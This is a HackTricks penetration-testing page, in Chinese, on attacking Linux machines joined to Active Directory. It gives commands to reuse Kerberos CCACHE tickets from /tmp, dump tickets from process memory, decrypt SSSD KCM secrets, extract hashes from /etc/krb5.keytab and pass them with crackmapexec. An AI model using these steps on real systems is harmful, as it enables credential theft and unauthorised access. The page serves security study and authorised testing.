# Linux Active Directory

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

一个Linux机器也可以存在于Active Directory环境中。

在AD中的Linux机器可能会**在文件中存储不同的CCACHE票证。这些票证可以像其他Kerberos票证一样被使用和滥用**。为了读取这些票证，您需要成为票证的用户所有者或者是机器内的**root**。

## 枚举

### 从Linux中枚举AD

如果您在Linux中（或Windows的bash中）可以访问AD，您可以尝试使用[https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn)来枚举AD。

您还可以查看以下页面以了解**从Linux中枚举AD的其他方法**：

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

FreeIPA是Microsoft Windows **Active Directory**的开源**替代方案**，主要用于**Unix**环境。它结合了一个完整的**LDAP目录**和一个类似于Active Directory的MIT **Kerberos**密钥分发中心的管理。利用Dogtag **证书系统**进行CA和RA证书管理，它支持**多因素**身份验证，包括智能卡。SSSD集成了Unix身份验证过程。在以下链接中了解更多信息：

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## 操作票证

### 传递票证

在这个页面，您将找到不同位置，您可以**在Linux主机中找到Kerberos票证**，在下一页中，您可以了解如何将这些CCache票证格式转换为Kirbi（您需要在Windows中使用的格式），以及如何执行PTT攻击：

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### 从/tmp中重用CCACHE票证

CCACHE文件是用于**存储Kerberos凭据**的二进制格式，通常以600权限存储在`/tmp`中。这些文件可以通过它们的**名称格式`krb5cc_%{uid}`**来识别，与用户的UID相关联。对于身份验证票证验证，应将**环境变量`KRB5CCNAME`**设置为所需票证文件的路径，从而使其可以被重用。

使用`env | grep KRB5CCNAME`列出用于身份验证的当前票证。该格式是可移植的，可以通过使用`export KRB5CCNAME=/tmp/ticket.ccache`设置环境变量来**重用票证**。Kerberos票证名称格式为`krb5cc_%{uid}`，其中uid是用户UID。
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### 从密钥环中重用CCACHE票证

**存储在进程内存中的Kerberos票证可以被提取**，特别是当机器的ptrace保护被禁用时(`/proc/sys/kernel/yama/ptrace_scope`)。用于此目的的一个有用工具可在[https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)找到，它通过注入到会话中并将票证转储到`/tmp`来简化提取过程。

要配置和使用此工具，请按照以下步骤进行：
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
### 从SSSD KCM中重用CCACHE票证

SSSD在路径`/var/lib/sss/secrets/secrets.ldb`中维护数据库的副本。相应的密钥存储在路径`/var/lib/sss/secrets/.secrets.mkey`的隐藏文件中。默认情况下，只有具有**root**权限的用户才能读取该密钥。

使用\*\*`SSSDKCMExtractor` \*\*并带有--database和--key参数将解析数据库并**解密秘密**。
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**凭证缓存Kerberos blob可以转换为可用的Kerberos CCache文件，可以传递给Mimikatz/Rubeus。**

### 从keytab重用CCACHE票证
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### 从 /etc/krb5.keytab 提取账户

服务账户密钥，对于以 root 权限运行的服务至关重要，被安全地存储在 **`/etc/krb5.keytab`** 文件中。这些密钥，类似于服务的密码，要求严格保密。

要检查 keytab 文件的内容，可以使用 **`klist`**。该工具旨在显示关键细节，包括用户认证的 **NT Hash**，特别是当密钥类型被识别为 23 时。
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
对于Linux用户，**`KeyTabExtract`**提供了提取RC4 HMAC哈希的功能，可以用于NTLM哈希重用。
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
在 macOS 上，**`bifrost`** 用作 keytab 文件分析工具。
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
利用提取的帐户和哈希信息，可以使用**`crackmapexec`**等工具建立与服务器的连接。
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## 参考资料
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在**网络安全公司**工作吗？想要看到你的**公司在HackTricks中被宣传**吗？或者想要访问**PEASS的最新版本或下载HackTricks的PDF**吗？查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 发现我们的独家[NFTs收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS & HackTricks周边**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **在Twitter上** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**关注**我。
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>
